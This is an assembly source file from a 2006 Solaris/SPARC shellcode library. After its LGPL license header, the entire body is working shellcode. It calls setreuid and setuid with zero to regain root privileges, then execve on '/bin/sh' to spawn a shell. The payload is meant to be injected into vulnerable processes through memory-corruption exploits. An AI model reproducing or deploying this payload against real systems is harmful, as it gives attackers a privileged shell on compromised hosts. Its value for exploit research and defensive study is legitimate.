/*
 *  $Id: sol-sparc-shellcode.s 40 2008-11-17 02:45:30Z ramon $
 *
 *  sol-sparc-shellcode.s
 *  Copyright 2006 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

.globl _start

_start:

# 00 bytes

setreuidcode:
    xor     %o1,%o1,%o1
    xor     %o0,%o0,%o0
    mov     0xca,%g1
    ta      0x08

setuidcode:
    xor     %o0,%o0,%o0
    mov     0x17,%g1
    ta      0x08

shellcode:
    xor     %o2,%o2,%o2
    sethi   %hi(0x2f62696e),%l0
    or      %l0,0x96e,%l0
    sethi   %hi(0x2f736800),%l1
    std     %l0,[%sp-0x08]
    sub     %sp,0x08,%o0
    st      %o0,[%sp-0x10]
    st      %g0,[%sp-0x0c]
    sub     %sp,0x10,%o1
    mov     0x3b,%g1
    ta      0x08
